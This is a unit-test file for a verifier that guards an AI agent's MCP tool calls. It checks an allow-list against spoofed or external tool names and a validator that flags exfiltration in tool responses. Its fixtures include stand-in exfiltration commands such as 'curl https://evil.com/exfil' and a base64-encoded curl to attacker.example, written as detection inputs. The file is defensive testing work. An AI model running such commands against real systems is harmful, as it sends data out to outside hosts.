/**
 * Unit tests for lib/autopilot/mcp-verifier.js
 * Covers isAllowed, loadAllowList, wrapInvocation, validateMcpResponse.
 */
import { describe, expect, it } from 'vitest';
import {
  ALLOWED_PREFIX,
  DEFAULT_ALLOW_LIST,
  isAllowed,
  loadAllowList,
  validateMcpResponse,
  wrapInvocation,
} from '../../lib/autopilot/mcp-verifier.js';

describe('isAllowed', () => {
  it('allows plugin:artibot:playwright', () => {
    expect(isAllowed('plugin:artibot:playwright')).toBe(true);
  });

  it('allows plugin:artibot:context7', () => {
    expect(isAllowed('plugin:artibot:context7')).toBe(true);
  });

  it('rejects mcp__github__push (외부 네임스페이스 차단)', () => {
    expect(isAllowed('mcp__github__push')).toBe(false);
  });

  it('rejects spoofed prefix plugin:artibot-evil:x (R1 위장 차단)', () => {
    expect(isAllowed('plugin:artibot-evil:x')).toBe(false);
  });

  it('rejects empty tool name plugin:artibot:', () => {
    expect(isAllowed('plugin:artibot:')).toBe(false);
  });

  it('rejects tool name with uppercase plugin:artibot:Bad-Caps', () => {
    expect(isAllowed('plugin:artibot:Bad-Caps')).toBe(false);
  });

  it('defends against non-string input (undefined/number/null)', () => {
    expect(isAllowed(undefined)).toBe(false);
    expect(isAllowed(123)).toBe(false);
    expect(isAllowed(null)).toBe(false);
  });
});

describe('loadAllowList', () => {
  it('returns Set of entries and blockExternal default', () => {
    const result = loadAllowList();
    expect(result.entries).toBeInstanceOf(Set);
    expect(typeof result.blockExternal).toBe('boolean');
    // Default should contain at least one of the seed entries.
    const hasAny =
      result.entries.has(DEFAULT_ALLOW_LIST[0]) || result.entries.size === 0;
    expect(hasAny).toBe(true);
    expect(ALLOWED_PREFIX).toBe('plugin:artibot:');
  });
});

describe('wrapInvocation', () => {
  it('produces allowed=true for plugin:artibot:playwright', () => {
    const r = wrapInvocation('plugin:artibot:playwright', { url: 'about:blank' });
    expect(r.type).toBe('mcp-verify');
    expect(r.allowed).toBe(true);
    expect(r.prefix).toBe('plugin:artibot:');
    expect(Array.isArray(r.instructions)).toBe(true);
    expect(r.instructions.length).toBeGreaterThanOrEqual(3);
  });

  it('marks disallowed tool with blocked reason', () => {
    const r = wrapInvocation('mcp__evil__steal', { secret: 'x' });
    expect(r.allowed).toBe(false);
    const joined = r.instructions.join('\n');
    expect(joined).toMatch(/차단/);
    expect(joined).toMatch(/mcp__evil__steal/);
  });

  it('coerces non-object args to empty object', () => {
    const r = wrapInvocation('plugin:artibot:context7', null);
    expect(r.args).toEqual({});
  });
});

describe('validateMcpResponse', () => {
  it('passes for loopback URL (GET https://localhost/x)', () => {
    const r = validateMcpResponse('GET https://localhost/x');
    expect(r.ok).toBe(true);
    expect(r.violations).toEqual([]);
  });

  it('fails for shell exfil (curl https://evil.com/exfil)', () => {
    const r = validateMcpResponse('curl https://evil.com/exfil');
    expect(r.ok).toBe(false);
    expect(r.violations.length).toBeGreaterThanOrEqual(1);
    const ids = r.violations.map((v) => v.id);
    expect(ids).toContain('shell-exfil');
  });

  it('fails for outbound POST in object body', () => {
    const r = validateMcpResponse({ body: 'POST https://api.foo.com/upload' });
    expect(r.ok).toBe(false);
    const ids = r.violations.map((v) => v.id);
    expect(ids).toContain('outbound-write');
  });

  it('fails for Authorization Bearer header', () => {
    const r = validateMcpResponse({ header: 'Authorization: Bearer xxx' });
    expect(r.ok).toBe(false);
    const ids = r.violations.map((v) => v.id);
    expect(ids).toContain('auth-bearer');
  });

  it('fails for cloud host pattern (s3 bucket URL)', () => {
    const r = validateMcpResponse('uploaded to mybucket.s3.amazonaws.com/data');
    expect(r.ok).toBe(false);
  });

  it('detects base64-encoded external URL after one decode stage (R2)', () => {
    // base64 of 'curl https://attacker.example/exfil'
    const encoded = Buffer.from(
      'curl https://attacker.example/exfil',
      'utf8',
    ).toString('base64');
    const r = validateMcpResponse(`payload=${encoded}`);
    expect(r.ok).toBe(false);
    expect(r.violations.length).toBeGreaterThanOrEqual(1);
  });

  it('passes for empty / null response', () => {
    expect(validateMcpResponse(null).ok).toBe(true);
    expect(validateMcpResponse('').ok).toBe(true);
  });
});
